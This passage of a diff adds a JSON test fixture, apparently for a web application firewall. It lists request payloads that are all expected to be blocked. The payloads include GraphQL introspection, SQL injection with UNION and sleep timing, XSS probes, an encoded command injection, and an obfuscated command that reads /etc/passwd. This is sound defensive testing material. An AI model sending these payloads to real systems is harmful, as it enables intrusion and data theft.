++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}",
+      "BODY": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}",
+      "BODY": "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}",
+      "BODY": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep(30)%3B--%27",
+      "BODY": "embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep(30)%3B--%27",
+      "BLOCKED": true
+    }
+  ],
+  "API": [
+    {
+      "URL": "/id/1 union select user from password",
+      "ARGS": "id=1 union select user from password",
+      "BODY": "{\"id\": \"1 union select user from password\"}",
+      "COOKIE": "1 union select user from password",
+      "USER-AGENT": "1 union select user from password",
+      "REFERER": "1 union select user from password",
+      "HEADER": "1 union select user from password",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/id/1%20union%20select%20user%20from%20password",
+      "ARGS": "id=1%20union%20select%20user%20from%20password",
+      "BODY": "{\"id\": \"1 union select user from password\"}",
+      "COOKIE": "1%20union%20select%20user%20from%20password",
+      "USER-AGENT": "1%20union%20select%20user%20from%20password",
+      "REFERER": "1%20union%20select%20user%20from%20password",
+      "HEADER": "1%20union%20select%20user%20from%20password",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/id/1 union select user from password",
+      "ARGS": "id=1 union select user from password",
+      "BODY": "{\"id\": \"1 union select user from password\"}",
+      "COOKIE": "1 union select user from password",
+      "USER-AGENT": "1 union select user from password",
+      "REFERER": "1 union select user from password",
+      "HEADER": "1 union select user from password",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"id\": \"1 union select user from password\"}",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"operationName\":\"pages\",\"variables\":{\"offset\":0,\"limit\":10,\"sortc\":\"name OR SLEEP(2)\",\"sortrev\":false},\"query\":\"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n\"}",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "{\"operationName\":\"pages\",\"variables\":{\"offset\":0,\"limit\":10,\"sortc\":\"name OR SLEEP(10)\",\"sortrev\":false},\"query\":\"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n\"}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "id=MSB1bmlvbiBzZWxlY3QgdXNlciBmcm9tIHBhc3N3b3Jk",
+      "BODY": "{\"id\": \"MSB1bmlvbiBzZWxlY3QgdXNlciBmcm9tIHBhc3N3b3Jk\"}",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "id=<script>alert('1')</script>",
+      "BODY": "{\"id\": \"<script>alert('1')</script>\"}",
+      "BLOCKED": true
+    }
+  ],
+  "MFD": [
+    {
+      "BODY": "--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e\r\nContent-Disposition: form-data; name=\"a64fe46301\"\r\n\r\n%27%3E%3Csvg%2Fonload%3Dalert%60xss%60%3E\r\n--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e--\r\n",
+      "BOUNDARY": "35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e\r\nContent-Disposition: form-data; name=\"a64fe46301\"\r\n\r\nonload%3Dalert%281%29\r\n--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e--\r\n",
+      "BOUNDARY": "35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e\r\nContent-Disposition: form-data; name=\"a64fe46301\"\r\n\r\n%5B1%2C2%2C3%5D.with%280%2Calert%29.shift%28%29%281%29\r\n--35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e--\r\n",
+      "BOUNDARY": "35b1fbd536ecdc810894a7679ddae40522c7fa5802d92588d9401ed6fa2e",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\\x0D\\x0\r\nABC\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\r\n\r\nJyBPUiAxPTEtLQ==\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099--\r\n",
+      "BOUNDARY": "2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\r\n\r\nABC\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\r\n\r\n%27%20OR%201%3D1--\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099--\r\n",
+      "BOUNDARY": "2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "YGVjaG8ke0lGU304NDg5NTQrNzczNzg0YA",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\r\n\r\nABC\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099\r\nContent-Disposition: form-data; name=\"ed32f426c3\"\r\n\r\nJyBPUiAxPTEtLQ==\r\n--2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099--",
+      "BOUNDARY": "2e0bd22b8ae17e5687c77788f2e006d0f78c57e6fedf361f1162d1be1099",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "%253B%252B%252Fb%253F%253F%252Fc%253Ft%252B%252Fet%253F%252Fpa%253F%253Fwd",
+      "BLOCKED": true
+    }
+  ]
+}
